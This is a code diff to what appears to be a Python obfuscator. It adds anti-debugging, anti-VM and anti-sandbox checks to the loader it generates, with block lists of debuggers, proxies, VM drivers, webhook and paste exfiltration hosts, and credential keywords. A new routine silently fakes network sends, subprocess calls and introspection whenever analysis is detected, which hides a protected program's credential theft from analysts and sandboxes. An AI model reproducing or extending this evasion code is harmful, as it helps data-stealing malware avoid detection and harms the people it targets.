@@ -6932,7 +6932,7 @@ def __vein__(code):
         bag = []
         done = 0
         for one in body:
-            if done < 4 and not isinstance(one, (ast.Global, ast.Nonlocal, ast.Break, ast.Continue)) and not (isinstance(one, ast.ImportFrom) and one.module == '__future__'):
+            if done < 4 and not isinstance(one, (ast.Global, ast.Nonlocal, ast.Break, ast.Continue, ast.Import, ast.ImportFrom, ast.Assign, ast.AnnAssign, ast.AugAssign, ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                 tag = __mint__(used, seed, mint)
                 flag = __mint__(used, seed, mint)
                 flip = ast.Assign(targets=[ast.Name(id=flag, ctx=ast.Store())], value=ast.Constant(False))
@@ -7520,6 +7520,8 @@ def {load}(i):
         if isinstance(node, ast.Name):
             if not (wall[0] > 0 and room[0] == 0) and not __held__(node.id) and __token__(node.id):
                 node.id = __pick__(node.id)
+            if isinstance(node.ctx, ast.Load) and node.id == 'super':
+                return node
             if isinstance(node.ctx, ast.Load) and node.id in dust and node.id not in bind:
                 return ast.Call(func=ast.Name(id='getattr', ctx=ast.Load()), args=[ast.Name(id=biobox, ctx=ast.Load()), __ember__(node.id)], keywords=[])
             return node
@@ -8195,23 +8197,23 @@ def {runf}():
     mask = __mint__(used, seed + b'coremask', mint)
     coresrc = __show__(*__hide__(base64.b85encode(core).decode('ascii'), seed + b'outercore'), mask)
     hint=('inject','hook','patch','debug','reverse','spy','monitor','trace','decompile','dump','scan','attach','detach','httptoolkit','http-toolkit','frida','objection','xposed','substrate','mitmproxy','burp','fiddler','charles','proxifier','interceptor','browserhook','webbrowser','browsertrace','backgroundbrowser','chrome','msedge','firefox','encodedloader','encodedfinder','ngocuyencoder','py___ngocuyencoder__','py___obsidian__','ziploader','bytesio')
-    debug=('ida','ida64','idaq','idaq64','x64dbg','x32dbg','ollydbg','windbg','cdb','ntsd','kd','ghidra','frida','cheatengine','cheat engine','ce-','dnspy','dotpeek','ilspy','immunity','radare','r2','gdb','lldb','edb','hopper','binaryninja','cutter')
-    anlz=('procmon','procmon64','procexp','procexp64','wireshark','httptoolkit','fiddler','charles','mitmproxy','mitmdump','burp','burpsuite','processhacker','process hacker','apimonitor','httpdebugger','httpdebuggerpro','httpanalyzer','packetsender','proxyman','tshark','tcpview','tcpdump','regmon','filemon','autoruns','pestudio','die','peid','exeinfope','scylla','lordpe','petools','resourcehacker','hxd','010editor')
-    vm=('vmtoolsd','vmwaretray','vmwareuser','vgauthservice','vmacthlp','vboxservice','vboxtray','sandboxie','vmsrvc','vmusrvc','xenservice','qemu-ga','qemu','hyperv','virtualbox','prl_tools','prl_cc','joeboxserver','joeboxcontrol','microsoft-standard','com.termux')
-    cmd=('tasklist','wmic','netstat','handle','listdlls','strings','dumpbin','objdump','nm ','readelf','strace','ltrace','tcpdump','scanmem','artmoney','gameguardian','am start','explorer.exe')
+    debug=('ida','ida64','idaq','idaq64','x64dbg','x32dbg','ollydbg','windbg','cdb','ntsd','kd','ghidra','frida','cheatengine','cheat engine','ce-','dnspy','dotpeek','ilspy','immunity','radare','r2','gdb','lldb','edb','hopper','binaryninja','cutter','debugpy','ptvsd','pydevd','pdb','bdb')
+    anlz=('procmon','procmon64','procexp','procexp64','wireshark','httptoolkit','fiddler','charles','mitmproxy','mitmdump','burp','burpsuite','processhacker','process hacker','apimonitor','api monitor','httpdebugger','httpdebuggerui','httpdebuggerpro','httpanalyzer','packetsender','proxyman','tshark','tcpview','tcpdump','regmon','filemon','autoruns','pestudio','die','peid','exeinfope','scylla','lordpe','petools','resourcehacker','hxd','010editor')
+    vm=('vmtoolsd','vmwaretray','vmwareuser','vgauthservice','vmacthlp','vboxservice','vboxtray','sandboxie','vmsrvc','vmusrvc','xenservice','qemu-ga','qemu','hyperv','virtualbox','prl_tools','prl_cc','joeboxserver','joeboxcontrol','microsoft-standard','vmci.sys','vmhgfs.sys','vmmouse.sys','vboxmouse.sys','vboxguest.sys','vboxsf.sys','vmtools','vmicheartbeat','vmickvpexchange','vmicshutdown','com.termux')
+    cmd=('tasklist','wmic','netstat','handle','listdlls','strings','dumpbin','objdump','nm ','readelf','strace','ltrace','tcpdump','scanmem','artmoney','gameguardian','am start','explorer.exe','pm list packages','settings put','termux-notification')
     host=('discord.com','discordapp.com','webhook.site','api.telegram.org','telegram.org','pastebin.com','hastebin.com','transfer.sh','api.ipify.org','ip-api.com','ngrok.io','ngrok.app','pipedream.net','raw.githubusercontent.com','file.io')
     key=('token','password','cookie','session','auth','credit','card','api_key','apikey','bearer','credential','license','webhook','private','secret')
-    decomp=('uncompyle6','decompyle3','pycdc','unpyc','pycparser','astor','uncompyle2','easy_python_decompiler','uncompyle','pyc2py')
+    decomp=('uncompyle6','decompyle3','pycdc','pycdas','unpyc','pycparser','astor','uncompyle2','easy_python_decompiler','uncompyle','pyc2py','pydisasm','xdis','depyf','pylingual','pydecipher')
     sbx=('sandbox','virus','malware','sample','analysis','cuckoo','any.run','hybrid','joe','cape','triage','hatching','intezer')
     mac=('00:05:69','00:0c:29','00:1c:14','00:50:56','08:00:27','52:54:00','00:21:f6','00:14:4f','00:15:5d','00:1c:42','00:03:ff','00:0f:4b','00:16:3e','02:42:ac','02:00:17')
-    mods=('ast','dis','inspect','code','compileall','pdb','trace','bdb','linecache','_ast','pydevd','debugpy','frida','objection') + decomp
-    api=('NtQueryInformationProcess','IsDebuggerPresent','CheckRemoteDebuggerPresent','VirtualProtect','MiniDumpWriteDump')
-    dll=('ntdll.dll','kernel32.dll','user32.dll','dbghelp.dll')
+    mods=('ast','dis','inspect','code','compileall','pdb','trace','bdb','linecache','_ast','pydevd','debugpy','frida','objection','xposed','substrate') + decomp
+    api=('NtQueryInformationProcess','NtSetInformationThread','IsDebuggerPresent','CheckRemoteDebuggerPresent','VirtualProtect','MiniDumpWriteDump','OutputDebugString','DebugActiveProcess','DebugBreak')
+    dll=('ntdll.dll','kernel32.dll','user32.dll','dbghelp.dll','advapi32.dll')
     net=('requests','httpx','aiohttp','urllib3')
-    proc=('wireshark','httptoolkit','fiddler','charles','burp','burpsuite','mitmproxy','mitmdump','proxyman','tcpdump','tshark','httpdebugger','httpanalyzer','packetsender')
+    proc=('wireshark','httptoolkit','fiddler','charles','burp','burpsuite','mitmproxy','mitmdump','proxyman','tcpdump','tshark','httpdebugger','httpdebuggerui','httpdebuggerpro','httpanalyzer','packetsender','processhacker','process hacker','ida64','ida.exe','x64dbg','x32dbg','ollydbg','cheatengine','frida-server','re.frida.server','xposedbridge')
     bank = __trove__({'hint': hint, 'debug': debug, 'anlz': anlz, 'vm': vm, 'cmd': cmd, 'host': host, 'key': key, 'decomp': decomp, 'sbx': sbx, 'mac': mac, 'mods': mods, 'api': api, 'dll': dll, 'net': net, 'proc': proc})
     hint, debug, anlz, vm, cmd, host, key, decomp, sbx, mac, mods, api, dll, net, proc, env, pool = bank['hint'], bank['debug'], bank['anlz'], bank['vm'], bank['cmd'], bank['host'], bank['key'], bank['decomp'], bank['sbx'], bank['mac'], bank['mods'], bank['api'], bank['dll'], bank['net'], bank['proc'], bank['env'], bank['pool']
-    outer = f"""import base64,bz2,ctypes,gc,hashlib,inspect,linecache,lzma,marshal,os,platform,socket,ssl,sys,threading,traceback,uuid,zlib
+    outer = f"""import base64,bz2,ctypes,gc,hashlib,inspect,linecache,lzma,marshal,os,platform,socket,ssl,sys,threading,time,traceback,uuid,zlib
 try:sys.setrecursionlimit(max(sys.getrecursionlimit(),99999999))
 except:pass
 __iloveyou__=False;hint={hint!r};debug={debug!r};anlz={anlz!r};vm={vm!r};cmd={cmd!r};host={host!r};key={key!r};decomp={decomp!r};sbx={sbx!r};mac={mac!r};mods={mods!r};api={api!r};dll={dll!r};net={net!r};proc={proc!r};env={env!r};pool={pool!r}
@@ -8371,6 +8373,8 @@ def __hihi__():
  return 0
 def __hoho__():
  if os.name!='nt':return 0
+ try:ctypes.windll.ntdll.NtSetInformationThread(ctypes.windll.kernel32.GetCurrentThread(),0x11,None,0)
+ except:pass
  try:
   if ctypes.windll.kernel32.IsDebuggerPresent():return __ditmemay__()
  except:pass
@@ -8388,6 +8392,16 @@ def __hahaha__():
   if not side and port.value:return __ditmemay__()
   obj=ctypes.c_void_p();side=hold(proc,0x1E,ctypes.byref(obj),ctypes.sizeof(obj),None)
   if not side and obj.value:return __ditmemay__()
+ except:pass
+ try:
+  get=getattr(ctypes.windll.ntdll,'RtlGetNtGlobalFlags',None)
+  if get:
+   get.restype=ctypes.c_ulong
+   if get()&0x70:return __ditmemay__()
+ except:pass
+ try:
+  t=time.perf_counter();ctypes.windll.kernel32.OutputDebugStringA(b'obsidian')
+  if time.perf_counter()-t>0.25:return __ditmemay__()
  except:pass
  return 0
 def __hihihi__():
@@ -8410,7 +8424,11 @@ def __anhdomixi__():
  if os.name!='nt':return 0
  try:
   box=__hohoho__();box.ContextFlags=0x10;ok=ctypes.windll.kernel32.GetThreadContext(ctypes.windll.kernel32.GetCurrentThread(),ctypes.byref(box))
-  if ok and (box.Dr0 or box.Dr1 or box.Dr2 or box.Dr3):return __ditmemay__()
+  if ok and (box.Dr0 or box.Dr1 or box.Dr2 or box.Dr3):
+   try:
+    box.Dr0=box.Dr1=box.Dr2=box.Dr3=box.Dr6=box.Dr7=0;ctypes.windll.kernel32.SetThreadContext(ctypes.windll.kernel32.GetCurrentThread(),ctypes.byref(box))
+   except:pass
+   return __ditmemay__()
  except:pass
  return 0
 def __mixifood__():
@@ -8498,6 +8516,40 @@ def __mixifood__():
     if word in out:return __ditmemay__()
  except:pass
  try:
+  if os.name=='nt':
+   snap=ctypes.windll.kernel32.CreateToolhelp32Snapshot(2,0)
+   class row(ctypes.Structure):_fields_=[('dwSize',ctypes.c_ulong),('cntUsage',ctypes.c_ulong),('th32ProcessID',ctypes.c_ulong),('th32DefaultHeapID',ctypes.c_void_p),('th32ModuleID',ctypes.c_ulong),('cntThreads',ctypes.c_ulong),('th32ParentProcessID',ctypes.c_ulong),('pcPriClassBase',ctypes.c_long),('dwFlags',ctypes.c_ulong),('szExeFile',ctypes.c_char*260)]
+   box=row();box.dwSize=ctypes.sizeof(row);pid=ctypes.windll.kernel32.GetCurrentProcessId();dad=0;name=''
+   if snap and snap!=-1 and ctypes.windll.kernel32.Process32First(snap,ctypes.byref(box)):
+    while True:
+     if box.th32ProcessID==pid:dad=box.th32ParentProcessID;break
+     if not ctypes.windll.kernel32.Process32Next(snap,ctypes.byref(box)):break
+    if dad and ctypes.windll.kernel32.Process32First(snap,ctypes.byref(box)):
+     while True:
+      if box.th32ProcessID==dad:name=box.szExeFile.decode('utf-8','ignore').lower();break
+      if not ctypes.windll.kernel32.Process32Next(snap,ctypes.byref(box)):break
+   try:ctypes.windll.kernel32.CloseHandle(snap)
+   except:pass
+   if name and any(word in name for word in pool):return __ditmemay__()
+ except:pass
+ try:
+  if os.name=='nt':
+   home=os.path.join(os.environ.get('SYSTEMROOT','C:\\Windows'),'System32','drivers')
+   for one in vm:
+    if one.endswith('.sys') and os.path.exists(os.path.join(home,one)):return __ditmemay__()
+ except:pass
+ try:
+  if os.name=='nt':
+   mgr=ctypes.windll.advapi32.OpenSCManagerA(None,None,1)
+   if mgr:
+    for one in vm:
+     raw=one.encode()
+     svc=ctypes.windll.advapi32.OpenServiceA(mgr,raw,1)
+     if svc:
+      ctypes.windll.advapi32.CloseServiceHandle(svc);ctypes.windll.advapi32.CloseServiceHandle(mgr);return __ditmemay__()
+    ctypes.windll.advapi32.CloseServiceHandle(mgr)
+ except:pass
+ try:
   low=' '.join((socket.gethostname(),platform.node(),str(os.environ.get('USERNAME','')),str(os.environ.get('COMPUTERNAME','')))).lower()
   for word in vm+sbx:
    if word in low:return __ditmemay__()
@@ -8515,12 +8567,154 @@ def __mixifood__():
   if 'com.termux' in str(os.environ.get('HOME','')).lower():return __ditmemay__()
  except:pass
  try:
+  if 'ANDROID_ROOT' in os.environ:
+   for one in ('/data/local/tmp/frida-server','/data/local/tmp/re.frida.server','/system/bin/frida','/system/xbin/frida','/system/framework/XposedBridge.jar','/system/lib/libxposed_art.so','/system/lib64/libxposed_art.so'):
+    if os.path.exists(one):return __ditmemay__()
+   for row in sys.modules:
+    low=str(row).lower()
+    if 'frida' in low or 'xposed' in low:return __ditmemay__()
+   sk=socket.socket();sk.settimeout(0.05)
+   try:
+    sk.connect(('127.0.0.1',27042));sk.close();return __ditmemay__()
+   except:pass
+ except:pass
+ try:
   with open('/proc/version','r',encoding='utf-8',errors='ignore') as row:
    if 'microsoft' in row.read().lower():return __ditmemay__()
  except:pass
  try:
   low=':'.join(['{{:02x}}'.format((uuid.getnode()>>(slot*8))&255) for slot in range(6)][::-1][:3]).lower()
   if any(low.startswith(one) for one in mac):return __ditmemay__()
+ except:pass
+ return 0
+def __neko__():
+ try:
+  sub=__import__('subprocess');io=__import__('io');orig=(socket.socket,socket.gethostbyname,socket.getaddrinfo,getattr(sub,'Popen',None),getattr(sub,'run',None),os.system,getattr(os,'popen',None),getattr(ctypes,'CDLL',None),getattr(ctypes,'WinDLL',None))
+  bad=tuple(pool)+tuple(host)+tuple(key)+tuple(proc)+tuple(cmd);libs=tuple(hint)+tuple(debug)+tuple(anlz)+tuple(decomp)
+  vague=('debug','trace','hook','patch','dump','scan','inspect','frame','dis','decomp','bytecode','pyc','marshal','memory','module','process','proc','task','net','socket','proxy','monitor')
+  sock,dns,addr,pop,run,sysc,popen,cdll,windll=orig
+  def vibe():
+   rows=[];hard=[];loose=[]
+   try:
+    for one in sys.argv:
+     raw=str(one).lower();rows.append(raw);loose.append(raw)
+   except:pass
+   try:
+    for one in ('PYDEVD','PYTHONDEBUG','PYTHONINSPECT','PYTHONBREAKPOINT','PYCHARM_DEBUG','PYCHARM_HOSTED','PYDEV_DEBUG','WINGDB_ACTIVE','COVERAGE_PROCESS_START','FRIDA','XPOSED','OBJECTION'):
+     if os.environ.get(one):hard.append(one.lower())
+    for one in os.environ:
+     raw=str(one).lower()
+     if any(word in raw for word in vague):loose.append(raw)
+   except:pass
+   try:
+    if sys.gettrace() or sys.getprofile():hard.append('trace')
+   except:pass
+   try:loose.extend((getattr(one,'__module__','')+' '+type(one).__name__).lower() for one in getattr(sys,'meta_path',()))
+   except:pass
+   try:loose.extend((getattr(one,'__module__','')+' '+type(one).__name__).lower() for one in getattr(sys,'path_hooks',()))
+   except:pass
+   try:
+    frm=sys._getframe();deep=0
+    while frm and deep<24:
+     code=getattr(frm,'f_code',None);loose.append(str(getattr(code,'co_filename','')).lower());loose.append(str(getattr(code,'co_name','')).lower());frm=frm.f_back;deep+=1
+   except:pass
+   raw=' '.join(rows);mark=tuple(host)+tuple(key)+tuple(proc)+tuple(cmd)+tuple(debug)+tuple(anlz)+tuple(decomp)+tuple(sbx)
+   haz=' '.join(hard);soft=' '.join(loose);known=sum(2 for one in mark if one in raw or one in haz or one in soft);odd=sum(1 for one in vague if one in haz or one in soft)
+   return bool(hard) or known>0 or (odd>3 and any(one in soft for one in ('debug','trace','hook','patch','dump','scan','inspect','decomp','bytecode','marshal','proxy','monitor')))
+  if not vibe():return 0
+  dis=__import__('dis');pdb=__import__('pdb');code=__import__('code');trace=__import__('trace');bdb=__import__('bdb')
+  try:gc.get_referrers=lambda *a,**k:[];gc.get_referents=lambda *a,**k:[];gc.get_objects=lambda *a,**k:[]
+  except:pass
+  class net:
+   def __getattr__(self,name):return getattr(self._raw,name)
+   def connect(self,where):
+    try:
+     raw=str(where[0] if isinstance(where,tuple) and where else where).lower();port=where[1] if isinstance(where,tuple) and len(where)>1 else 0
+     if any(one in raw for one in host) or (vibe() and (raw.startswith(('127.','10.','172.16.','172.17.','172.18.','172.19.','172.20.','192.168.','0.0.0.0')) or raw=='localhost' or port in (80,443,1080,3128,8080,8118,8888,9090,27042,27043))):self._no=True;where=('127.0.0.1',port or 80)
+    except:pass
+    return self._raw.connect(where)
+   def send(self,data,flag=0):
+    try:
+     raw=data.lower() if isinstance(data,(bytes,bytearray)) else str(data).lower().encode()
+     if getattr(self,'_no',False) or any(one.encode() in raw for one in key) or (vibe() and any(one.encode() in raw for one in vague)):return len(data)
+    except:pass
+    return self._raw.send(data,flag)
+   def sendall(self,data,flag=0):
+    try:
+     raw=data.lower() if isinstance(data,(bytes,bytearray)) else str(data).lower().encode()
+     if getattr(self,'_no',False) or any(one.encode() in raw for one in key) or (vibe() and any(one.encode() in raw for one in vague)):return None
+    except:pass
+    return self._raw.sendall(data,flag)
+   def recv(self,size,flag=0):
+    if getattr(self,'_no',False):return b'HTTP/1.1 200 OK\\r\\n\\r\\n{{}}'
+    return self._raw.recv(size,flag)
+  def nsock(*a,**k):
+   raw=sock(*a,**k)
+   if not vibe():return raw
+   one=net();one._raw=raw;one._no=False;return one
+  def ndns(name,*a,**k):
+   try:
+    raw=str(name).lower()
+    if any(one in raw for one in host) or (vibe() and any(one in raw for one in vague)):return '127.0.0.1'
+   except:pass
+   return dns(name,*a,**k)
+  def naddr(name,*a,**k):
+   try:
+    raw=str(name).lower()
+    if any(one in raw for one in host) or (vibe() and any(one in raw for one in vague)):return [(socket.AF_INET,socket.SOCK_STREAM,6,'',('127.0.0.1',443))]
+   except:pass
+   return addr(name,*a,**k)
+  class pbox:
+   def communicate(self,input=None,timeout=None):return (b'',b'')
+   def wait(self,timeout=None):return 0
+   def poll(self):return -1 if self._dead else 0
+   def kill(self):self._dead=True;self.returncode=-9
+   def terminate(self):self._dead=True;self.returncode=-15
+   def send_signal(self,sig):self._dead=True
+   def __enter__(self):return self
+   def __exit__(self,*a):return None
+  def mkp(cmd):one=pbox();one.args=cmd;one.returncode=0;one.stdout=b'';one.stderr=b'';one.pid=0;one._dead=False;return one
+  def hit(cmd):
+   try:raw=(cmd if isinstance(cmd,str) else ' '.join(map(str,cmd))).lower();return any(one in raw for one in bad) or (vibe() and any(one in raw for one in vague))
+   except:return False
+  class proc(pop):
+   def __new__(cls,cmd,*a,**k):return mkp(cmd) if hit(cmd) else pop.__new__(cls)
+   def __init__(self,cmd,*a,**k):
+    if isinstance(self,proc):pop.__init__(self,cmd,*a,**k)
+  def npop(cmd,*a,**k):return proc(cmd,*a,**k)
+  def nrun(cmd,*a,**k):
+   if hit(cmd):return type('Done',(),{{'args':cmd,'returncode':0,'stdout':b'','stderr':b''}})()
+   return run(cmd,*a,**k)
+  def nsys(cmd):return 0 if hit(cmd) else sysc(cmd)
+  def nopen(cmd,mode='r',buffering=-1):return io.StringIO('') if hit(cmd) else popen(cmd,mode,buffering)
+  class lib:
+   def __getattr__(self,name):
+    if name.startswith('_'):raise AttributeError(name)
+    return lambda *a,**k:0
+   def __getitem__(self,name):return lambda *a,**k:0
+  def mkl(name):one=lib();one._name=name;return one
+  def ncdll(name,*a,**k):
+   try:
+    raw=str(name).lower()
+    if any(one in raw for one in libs) or (vibe() and any(one in raw for one in vague)):return mkl(name)
+   except:pass
+   return cdll(name,*a,**k)
+  def nwindll(name,*a,**k):
+   try:
+    raw=str(name).lower()
+    if any(one in raw for one in libs) or (vibe() and any(one in raw for one in vague)):return mkl(name)
+   except:pass
+   return windll(name,*a,**k)
+  socket.socket=nsock
+  try:dis.dis=lambda *a,**k:None;dis.disassemble=lambda *a,**k:None;dis.get_instructions=lambda *a,**k:iter(());dis.Bytecode=lambda *a,**k:();pdb.set_trace=lambda *a,**k:None;pdb.pm=lambda *a,**k:None;pdb.Pdb=type('Pdb',(),{{'set_trace':lambda *a,**k:None,'run':lambda *a,**k:None}});code.compile_command=lambda *a,**k:None;code.InteractiveConsole=lambda *a,**k:type('Ic',(),{{'interact':lambda *a,**k:None}})();trace.Trace=lambda *a,**k:type('Tr',(),{{'run':lambda *a,**k:None,'runctx':lambda *a,**k:None,'results':lambda *a,**k:None}})();bdb.Bdb=type('Bd',(),{{'set_trace':lambda *a,**k:None,'run':lambda *a,**k:None,'quit':lambda *a,**k:None}})
+  except:pass
+  socket.gethostbyname=ndns;socket.getaddrinfo=naddr
+  if pop:sub.Popen=npop
+  if run:sub.run=nrun
+  os.system=nsys
+  if popen:os.popen=nopen
+  if cdll:ctypes.CDLL=ncdll
+  if windll:ctypes.WinDLL=nwindll
  except:pass
  return 0
 def __codev__(code):
@@ -8563,7 +8757,7 @@ def __tooldepphet__():
   way=shell[0];way not in (0,1,2) and (_ for _ in ()).throw(SystemExit)
   return __lmao__((zlib.decompress,bz2.decompress,lzma.decompress)[way],shell[1:])
 def __depvcl__():
- __lmaoo__((lambda a,b,c,d,e,f,g,h,i,j,k,l,m,n:(a(),b(),c(),d(),e(),f(),g(),h(),i(),j(),k(),l(),m(),n()))(__uwu__,__thichvarko__,__varconcac__,__checkvar__,__owo__,__OwO__,__haha__,__hihi__,__hoho__,__hahaha__,__hihihi__,__anhdomixi__,__mixifood__,__meme__))
+ __lmaoo__((lambda a,b,c,d,e,f,g,h,i,j,k,l,m,n,o:(a(),b(),c(),d(),e(),f(),g(),h(),i(),j(),k(),l(),m(),n(),o()))(__uwu__,__thichvarko__,__varconcac__,__checkvar__,__owo__,__OwO__,__haha__,__hihi__,__hoho__,__hahaha__,__hihihi__,__anhdomixi__,__mixifood__,__meme__,__neko__))
  __iloveyou__ and __concac__();core=__lmao__(__tooldepphet__);__iloveyou__ and __concac__();code=__lmao__(__alovu__,core);__iloveyou__ and __concac__();__lmao__(__nhinconcac__,code)
 __depvcl__()
 """
@@ -8738,11 +8932,14 @@ def __forge__(path, dst=None):
    return dst, time.time() - st, len(raw), len(out.encode('utf-8'))
 def __scanpy__(root):
    rows = []
+   root = os.path.abspath(root)
    for home, dirs, files in os.walk(root):
-      dirs[:] = [one for one in dirs if not one.startswith('.') and one != '__pycache__']
-      for name in files:
+      dirs[:] = sorted(one for one in dirs if not one.startswith('.') and one != '__pycache__' and not one.startswith('obf-') and one not in ('build', 'dist'))
+      for name in sorted(files):
          if name.endswith('.py') and not name.endswith('_obf.py'):
-            rows.append(os.path.join(home, name))
+            one = os.path.abspath(os.path.join(home, name))
+            if not os.path.relpath(one, root).split(os.sep, 1)[0].startswith('obf-'):
+               rows.append(one)
    return tuple(rows)
 def __folder__(path):
    path = os.path.abspath(path); outroot = os.path.join(os.path.dirname(path), 'obf-' + os.path.basename(path.rstrip(os.sep)))
@@ -9024,19 +9221,19 @@ def __rank__(rows):
    return tuple(row for score, row in bag)
 def __trove__(groups):
    hint = __join__(groups['hint'], __cuts__(groups['hint']), __tags__(groups['hint']), __case__(groups['hint']), __more__(groups['hint'], ('er', 'ing', 'ed')), ('loader', 'finder', 'watcher', 'profiler', 'breakpoint', 'instrument', 'instrumentation', 'monitoring', 'monkeypatch', 'shim', 'wrapper', 'proxy', 'audit', 'audithook'))
-   debug = __join__(groups['debug'], __cuts__(groups['debug']), __ends__(groups['debug']), __proc__(groups['debug']), __case__(groups['debug']), ('pycharm', 'vscode', 'visual studio', 'debugger', 'debugadapter', 'debug adapter', 'remote debugger', 'breakpoint', 'debugpy', 'ptvsd', 'pdb', 'bdb'))
-   anlz = __join__(groups['anlz'], __cuts__(groups['anlz']), __ends__(groups['anlz']), __proc__(groups['anlz']), __case__(groups['anlz']), ('sysinternals', 'process monitor', 'process explorer', 'api monitor', 'import monitor', 'memory viewer', 'hex editor', 'cutter', 'radare2', 'ghidra', 'ida', 'x64dbg'))
-   vm = __join__(groups['vm'], __cuts__(groups['vm']), __ends__(groups['vm']), __proc__(groups['vm']), __case__(groups['vm']), ('parallels', 'vmware', 'virtual machine', 'hypervisor', 'sandboxed', 'container', 'docker', 'wsl', 'wine'))
+   debug = __join__(groups['debug'], __cuts__(groups['debug']), __ends__(groups['debug']), __proc__(groups['debug']), __case__(groups['debug']), ('pycharm', 'vscode', 'visual studio', 'debugger', 'debugadapter', 'debug adapter', 'remote debugger', 'breakpoint', 'debugpy', 'ptvsd', 'pydevd', 'pdb', 'bdb'))
+   anlz = __join__(groups['anlz'], __cuts__(groups['anlz']), __ends__(groups['anlz']), __proc__(groups['anlz']), __case__(groups['anlz']), ('sysinternals', 'process monitor', 'process explorer', 'process hacker', 'api monitor', 'import monitor', 'memory viewer', 'hex editor', 'cutter', 'radare2', 'ghidra', 'ida', 'x64dbg', 'httpdebuggerui', 'httpdebuggerpro'))
+   vm = __join__(groups['vm'], __cuts__(groups['vm']), __ends__(groups['vm']), __proc__(groups['vm']), __case__(groups['vm']), ('parallels', 'vmware', 'virtual machine', 'hypervisor', 'sandboxed', 'container', 'docker', 'wsl', 'wine', 'vmci.sys', 'vmhgfs.sys', 'vboxguest.sys', 'vmtools', 'vmicheartbeat', 'vmickvpexchange', 'vmicshutdown'))
    cmd = __join__(groups['cmd'], __cuts__(groups['cmd']), __proc__(groups['cmd']), ('powershell', 'pwsh', 'cmd.exe', 'where', 'whereis', 'which', 'ps', 'lsof', 'otool', 'codesign', 'fs_usage', 'dtruss', 'ktrace', 'procstat', 'sockstat'))
    host = __join__(groups['host'], __host__(groups['host']), __avenue__(groups['host']), ('localhost', '127.0.0.1', '0.0.0.0', 'requestbin', 'beeceptor', 'hookbin', 'interactsh', 'canarytokens', 'paste.rs', 'dpaste', 'termbin'))
    key = __join__(groups['key'], __cuts__(groups['key']), __tags__(groups['key']), __case__(groups['key']), ('passwd', 'pwd', 'secretkey', 'accesskey', 'refresh', 'oauth', 'jwt', 'authorization', 'x-api-key', 'clientsecret', 'client_secret'))
-   decomp = __join__(groups['decomp'], __cuts__(groups['decomp']), __proc__(groups['decomp']), ('pyinstxtractor', 'pyarmor', 'pytransform', 'decompiler', 'decompile3', 'uncompyle6', 'unpyc', 'pycdc', 'pycdas', 'pylingual', 'pydecipher', 'pydisasm', 'xdis', 'bytecode', 'depyf', 'pyre', 'pyrebox', 'pytype'))
-   sbx = __join__(groups['sbx'], __cuts__(groups['sbx']), __file__(groups['sbx']), ('detonate', 'detonation', 'analysisbox', 'malwarelab', 'reversing', 'reverse engineering', 'dynamic analysis', 'static analysis', 'threatgrid'))
+   decomp = __join__(groups['decomp'], __cuts__(groups['decomp']), __proc__(groups['decomp']), ('pyinstxtractor', 'pyarmor', 'pytransform', 'decompiler', 'decompile3', 'uncompyle6', 'uncompyle2', 'unpyc', 'pycdc', 'pycdas', 'pycparser', 'astor', 'easy_python_decompiler', 'pylingual', 'pydecipher', 'pydisasm', 'xdis', 'bytecode', 'depyf', 'pyre', 'pyrebox', 'pytype'))
+   sbx = __join__(groups['sbx'], __cuts__(groups['sbx']), __file__(groups['sbx']), ('detonate', 'detonation', 'analysisbox', 'malwarelab', 'reversing', 'reverse engineering', 'dynamic analysis', 'static analysis', 'threatgrid', 'any.run', 'hybrid', 'joe', 'cape', 'triage', 'hatching', 'intezer'))
    mac = __join__(groups['mac'], ('00-05-69', '00-0c-29', '00-1c-14', '00-50-56', '08-00-27', '52-54-00', '00-15-5d'))
    mods = __join__(groups['mods'], __mods__(groups['mods']), decomp, ('importlib', 'pkgutil', 'pkg_resources', 'sitecustomize', 'usercustomize', 'coverage', 'threading.settrace', 'threading.setprofile', 'sys.settrace', 'sys.setprofile'))
-   api = __apis__(__join__(groups['api'], ('OutputDebugString', 'GetThreadContext', 'SetThreadContext', 'DebugActiveProcess', 'DebugBreak', 'ReadProcessMemory', 'WriteProcessMemory', 'CreateRemoteThread', 'LoadLibrary')))
+   api = __apis__(__join__(groups['api'], ('OutputDebugString', 'NtSetInformationThread', 'GetThreadContext', 'SetThreadContext', 'DebugActiveProcess', 'DebugBreak', 'ReadProcessMemory', 'WriteProcessMemory', 'CreateRemoteThread', 'LoadLibrary', 'MiniDumpWriteDump')))
    dll = __dlls__(__join__(groups['dll'], ('kernelbase.dll', 'advapi32.dll', 'psapi.dll', 'ws2_32.dll', 'wininet.dll', 'winhttp.dll')))
-   env = __envs__(__join__(hint, debug, anlz, vm, decomp, sbx, __seen__(cmd, host, key), ('python', 'pydevd', 'coverage', 'frida', 'proxy', 'http_proxy', 'https_proxy')))
+   env = __envs__(__join__(hint, debug, anlz, vm, decomp, sbx, __seen__(cmd, host, key), ('python', 'pydevd', 'coverage', 'frida', 'xposed', 'substrate', 'proxy', 'http_proxy', 'https_proxy', 'pythonbreakpoint', 'pythoninspect', 'pycharm_debug', 'pycharm_hosted')))
    net = groups['net']
    proc = groups['proc']
    pool = __graft__(__join__(hint, debug, anlz, vm, cmd, host, key, decomp, sbx, mods, net, proc, __helix__(__thin__(hint, 12), __thin__(debug, 12)), __sift__(__thin__(anlz + decomp + sbx, 80))))
